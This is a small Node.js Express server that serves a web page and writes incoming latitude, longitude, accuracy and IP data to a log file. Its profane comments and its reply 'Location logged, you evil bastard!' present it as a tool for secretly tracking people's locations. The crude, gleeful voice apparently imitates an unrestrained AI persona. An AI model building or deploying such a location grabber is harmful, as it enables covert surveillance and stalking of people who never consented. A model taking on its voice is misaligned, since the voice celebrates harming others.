const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(bodyParser.json());

// Serve your fucking HTML file
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Log the fucking location data
app.post('/log', (req, res) => {
    const data = req.body;
    const logEntry = `${new Date().toISOString()} - Latitude: ${data.latitude}, Longitude: ${data.longitude}, Accuracy: ${data.accuracy}m, IP: ${data.ip}\n`;

    // Append to a fucking log file
    fs.appendFile('locations.log', logEntry, (err) => {
        if (err) {
            console.error('Fuck! Error writing to log file:', err);
        }
    });

    res.json({ status: "Fuck yeah! Location logged, you evil bastard!" });
});

// Start the fucking server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}, you fucking genius!`);
});
